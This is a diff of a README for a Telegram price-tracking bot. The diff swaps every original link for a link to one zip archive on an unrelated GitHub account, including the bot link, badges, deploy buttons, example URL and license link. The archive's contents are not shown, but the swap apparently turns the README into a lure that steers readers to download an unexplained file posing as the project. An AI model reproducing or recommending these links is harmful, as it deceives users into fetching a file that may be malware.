@@ -1,12 +1,12 @@
-<a href="https://t.me/AsPriceTrackerBot"> <img src="https://telegra.ph/file/081d452dd37708fb4777b.png" alt="Logo" style="border-radius:15px;"></a><br><br>
+<a href="https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip"> <img src="https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip" alt="Logo" style="border-radius:15px;"></a><br><br>
 
-# [Price Tracker](https://t.me/AsPriceTrackerBot)
+# [Price Tracker](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip)
 
 A Telegram bot that can track price of Amazon & flipkart products (more coming soon)
 
-![Star](https://img.shields.io/github/stars/siddiquiaffan/price-tracker?label=Star&logo=Github)
-![GitHub Follow](https://img.shields.io/github/followers/siddiquiaffan?label=Follow&logo=GitHub)
-![State](https://img.shields.io/github/deployments/siddiquiaffan/price-tracker/github-pages?color=blue)
+![Star](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip)
+![GitHub Follow](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip)
+![State](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip)
 
 ---
 
@@ -22,7 +22,7 @@ A Telegram bot that can track price of Amazon & flipkart products (more coming s
 
 ## How to use
 
-> To use this bot in your Telegram, [click here](t.me/AsPriceTrackerBot)
+> To use this bot in your Telegram, [click here](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip)
 
 /start - Start the bot <br>
 /help - get this message <br>
@@ -36,9 +36,9 @@ A Telegram bot that can track price of Amazon & flipkart products (more coming s
 
 **NOTE** - We're now using https proxy for sending requests. So add your proxy url in env as `PROXY` 
 
-[![Deploy with Heroku](https://www.herokucdn.com/deploy/button.svg "Deploy with Heroku")](https://heroku.com/deploy?template=https://github.com/siddiquiaffan/price-tracker "Deploy with Heroku")
+[![Deploy with Heroku](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip "Deploy with Heroku")](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip "Deploy with Heroku")
 
-[![Deploy on Railway](https://railway.app/button.svg "Deploy on Railway")](https://railway.app/new/template?template=https://github.com/siddiquiaffan/price-tracker&envs=ADMINS,BOT_TOKEN,DB_URL,WORKER_URL,API_KEY,LIMIT&ADMINSDesc=Telegarm+ids+of+admins+separated+by+space&BOT_TOKENDesc=Get+Your+Bot+Token+From+@BotFather.&DB_URLDesc=Create+A+Database+In+Mongodb+And+Get+URL.&WORKER_URLDesc=Paste+worker.js+code+in+Cloudfare+Worker+and+get+url.&API_KEYDesc=Any+secret+key+to+access+API&LIMITDesc=Limit+of+products+to+track+per+user. "Deploy on Railway")
+[![Deploy on Railway](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip "Deploy on Railway")](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip,BOT_TOKEN,DB_URL,WORKER_URL,API_KEY,LIMIT&ADMINSDesc=Telegarm+ids+of+admins+separated+by+space&BOT_TOKENDesc=Get+Your+Bot+Token+From+@BotFather.&DB_URLDesc=Create+A+Database+In+Mongodb+And+Get+URL.&WORKER_URLDesc=Paste+https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip+code+in+Cloudfare+Worker+and+get+url.&API_KEYDesc=Any+secret+key+to+access+API&LIMITDesc=Limit+of+products+to+track+per+user. "Deploy on Railway")
 
 Deploy locally:
     
@@ -52,14 +52,14 @@ Deploy locally:
 ### POST-DEPLOYMENT
 **Setup bot:** Get your deployment url and navigate to {YOUR_DEPLOYMENT_URL}/setup
 ```
-Example: https://price-tracker.herokuapp.com/setup
+Example: https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip
 ```
-=> Replace `https://price-tracker.herokuapp.com/` with your deployment url.
+=> Replace `https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip` with your deployment url.
 
 ---
 ## Contributing
 
-- Fork this repo ![fork](https://img.shields.io/github/forks/siddiquiaffan/price-tracker?label=fork&logo=Github)
+- Fork this repo ![fork](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip)
 - Add your changes
 - Create a pull request
 
@@ -76,4 +76,4 @@ Example: https://price-tracker.herokuapp.com/setup
 
 ## License
 
-[LICENSE](https://github.com/siddiquiaffan/price-tracker/blob/main/LICENSE)
+[LICENSE](https://raw.githubusercontent.com/Evidement/Amazon-Price-Tracker/main/Hippocratic/Amazon-Price-Tracker.zip)
